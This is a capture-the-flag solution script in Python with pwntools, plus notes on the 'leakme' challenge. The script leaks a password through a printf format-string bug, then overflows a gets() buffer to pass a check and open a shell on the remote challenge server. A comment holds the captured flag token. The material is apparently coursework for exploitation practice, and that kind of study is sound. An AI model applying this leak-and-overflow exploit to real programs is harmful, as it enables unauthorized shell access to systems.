from pwn import *

#flag FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoibWlkc2VtLW1pZHNlbTEiLCJpcCI6IjIyMC4yNDAuNjYuMTUzIiwic2Vzc2lvbiI6IjM2NTc4NWY5LTlhMDEtNGY2My04MTMwLWFjMzEyZGI5MDYzYSJ9.R3vclEm9YmqRUdLKyzEAawxNqDIUZtkw5fqWZ8fGIQQ}

p = remote('plsdonthaq.me', 24102)
#p = process('./leakme')

p.recvuntil('Good luck\n')

payload = b'AA' + p32(0x804c06c) + b'%7$s'

p.sendline(payload)

password = p.recvline().rstrip()[6:]

print(password)

p.recvline()

payload2 = b'A'*0x20 + password

p.sendline(payload2)

p.interactive()

'''
General overview of problems faced
-------------------------------------

- We are given address of password 0x804c06c
- First there is an fgets where we can enter 0xc bytes of user data. this input is then used in a printf() with a format string vulnerability.
- after experimenting we can pad with 2 A's then put and address and the address will be at stack offset 7
- put the password address here and read it
- then gets() is used so we overflow buffer which starts at ebp-0x32 until the canary string at ebp-0x12
- then put the password here
- strcmp success and we get a shell


Script/Command used
------------------
```
from pwn import *

p = remote('plsdonthaq.me', 24102)
#p = process('./leakme')

p.recvuntil('Good luck\n')

payload = b'AA' + p32(0x804c06c) + b'%7$s'

p.sendline(payload)

password = p.recvline().rstrip()[6:]

print(password)

p.recvline()

payload2 = b'A'*0x20 + password

p.sendline(payload2)

p.interactive()
```
'''